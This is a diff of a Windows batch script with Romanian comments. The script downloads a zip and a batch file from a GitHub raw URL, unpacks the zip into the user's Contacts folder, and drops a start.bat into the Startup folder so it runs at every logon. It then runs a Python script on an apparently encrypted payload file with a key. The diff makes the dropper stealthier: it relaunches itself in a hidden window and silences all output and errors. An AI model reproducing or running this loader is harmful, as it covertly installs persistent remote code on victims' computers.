@@ -1,31 +1,63 @@
 @echo off
+setlocal enabledelayedexpansion
 
-setlocal
+:: Ascunde fereastra cmd
+if "%~1"=="" (
+    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -ArgumentList '/c','""%~f0""','hidden' -WindowStyle Hidden"
+    exit /b
+)
+
 set "site_url=https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/"
 set "z=%TEMP%\zo.zip"
 set "d=%USERPROFILE%\Contacts\zo"
 set "s=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"
 
-:: Create target directory if not exists
-if not exist "%d%" mkdir "%d%"
+:: Crează directorul țintă
+if not exist "%d%" mkdir "%d%" >nul 2>&1
 
-:: Download zo.zip from the website
-powershell -nologo -noprofile -command "$w=New-Object Net.WebClient;$w.DownloadFile('%site_url%zo.zip','%z%')"
+:: Descarcă zo.zip (silent)
+powershell -WindowStyle Hidden -Command "
+try {
+    $wc = New-Object Net.WebClient
+    $wc.DownloadFile('%site_url%zo.zip', '%z%')
+} catch { exit 1 }
+"
 
-:: Extract the zip file
-powershell -nologo -noprofile -command "Expand-Archive -LiteralPath '%z%' -DestinationPath '%d%' -Force"
-del "%z%"
+:: Extrage arhiva (silent)
+powershell -WindowStyle Hidden -Command "
+try {
+    Expand-Archive -LiteralPath '%z%' -DestinationPath '%d%' -Force
+    Remove-Item '%z%' -Force
+} catch { exit 1 }
+"
 
-:: Download start.bat from the same website
-powershell -nologo -noprofile -command "$w=New-Object Net.WebClient;$w.DownloadFile('%site_url%start.bat','%s%')"
+:: Descarcă start.bat în startup (silent)
+powershell -WindowStyle Hidden -Command "
+try {
+    $wc = New-Object Net.WebClient
+    $wc.DownloadFile('%site_url%start.bat', '%s%')
+} catch { exit 1 }
+"
 
-:: Run the Python script
-cd /d "%d%"
-python.exe sh.py -i voo.bin -k x.txt
+:: Rulează script Python (silent)
+cd /d "%d%" >nul 2>&1
+python.exe sh.py -i voo.bin -k x.txt >nul 2>&1
 
-:: Download result files based on exit code
-if %errorlevel%==0 (
-    powershell -nologo -noprofile -command "$w=New-Object Net.WebClient;$w.DownloadFile('%site_url%a.txt','%TEMP%\a.txt')"
+:: Descarcă fișier rezultat (silent)
+if !errorlevel!==0 (
+    powershell -WindowStyle Hidden -Command "
+    try {
+        $wc = New-Object Net.WebClient
+        $wc.DownloadFile('%site_url%a.txt', '%TEMP%\a.txt')
+    } catch { exit 1 }
+    "
 ) else (
-    powershell -nologo -noprofile -command "$w=New-Object Net.WebClient;$w.DownloadFile('%site_url%b.txt','%TEMP%\b.txt')"
+    powershell -WindowStyle Hidden -Command "
+    try {
+        $wc = New-Object Net.WebClient
+        $wc.DownloadFile('%site_url%b.txt', '%TEMP%\b.txt')
+    } catch { exit 1 }
+    "
 )
+
+exit /b
